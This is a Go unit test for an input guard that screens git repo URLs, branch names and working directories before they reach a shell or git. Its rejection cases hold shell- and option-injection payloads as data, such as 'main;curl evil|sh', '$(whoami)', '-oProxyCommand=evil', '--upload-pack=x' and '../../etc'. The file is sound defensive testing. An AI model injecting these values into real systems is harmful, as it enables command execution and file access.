package handler

import "testing"

// TestAdmitRepoFields locks in the boundary guard for the executor's git
// clone / cd: repo_url, repo_branch and working_dir reach a shell (K8s executor)
// and git argv (local executor), so shell metacharacters and option-injection
// payloads must be rejected here. Empty values are allowed — the service fills
// defaults (branch "main", working_dir ".").
//
// wantWorkingDir is the other half of the call: what the caller stores. It is
// the canonical spelling, and it comes back from the same call that admitted
// it, because a route that judged one spelling and stored another would be
// storing a value nothing checked.
func TestAdmitRepoFields(t *testing.T) {
	tests := []struct {
		name                       string
		repoURL, branch, workindir string
		wantWorkingDir             string
		wantErr                    bool
	}{
		{"all empty (upload workspace)", "", "", "", "", false},
		{"plain https + main + root", "https://github.com/org/repo.git", "main", ".", ".", false},
		{"ssh scp-style + nested branch + subdir", "git@github.com:org/repo.git", "feature/thing", "modules/vpc", "modules/vpc", false},
		{"branch with dots and dashes", "https://x/y.git", "release-1.2.x", "envs/production", "envs/production", false},

		// A respelled directory is admitted and stored as the leaf it names.
		{"respelled working_dir", "https://x/y.git", "main", ".//envs/./production/", "envs/production", false},
		{"every spelling of the repo root", "https://x/y.git", "main", "./", ".", false},

		// Shell-injection payloads in the branch.
		{"branch command chaining", "https://x/y.git", "main;curl evil|sh", ".", "", true},
		{"branch command substitution", "https://x/y.git", "$(whoami)", ".", "", true},
		{"branch backticks", "https://x/y.git", "`id`", ".", "", true},
		{"branch with space", "https://x/y.git", "main dev", ".", "", true},
		// Git option-injection in the branch.
		{"branch leading dash", "https://x/y.git", "--upload-pack=x", ".", "", true},

		// Path traversal / shell payloads in working_dir.
		{"working_dir traversal", "https://x/y.git", "main", "../../etc", "", true},
		{"working_dir absolute", "https://x/y.git", "main", "/etc/passwd", "", true},
		{"working_dir command sub", "https://x/y.git", "main", "$(reboot)", "", true},
		{"working_dir leading dash", "https://x/y.git", "main", "-rf", "", true},
		// The same option, spelled so that it only becomes one once the path is
		// cleaned. What the row would hold is what the caller is judged on.
		{"working_dir cleans into a leading dash", "https://x/y.git", "main", "./-rf", "", true},
		{"working_dir cleans into a git option", "https://x/y.git", "main", ".//--upload-pack", "", true},

		// repo_url option-injection.
		{"repo_url leading dash", "-oProxyCommand=evil", "main", ".", "", true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			workingDir, err := admitRepoFields(tc.repoURL, tc.branch, tc.workindir)
			if (err != nil) != tc.wantErr {
				t.Errorf("admitRepoFields(%q,%q,%q) error = %v, wantErr %v",
					tc.repoURL, tc.branch, tc.workindir, err, tc.wantErr)
			}
			if workingDir != tc.wantWorkingDir {
				t.Errorf("admitRepoFields(%q,%q,%q) working_dir = %q, want %q",
					tc.repoURL, tc.branch, tc.workindir, workingDir, tc.wantWorkingDir)
			}
		})
	}
}
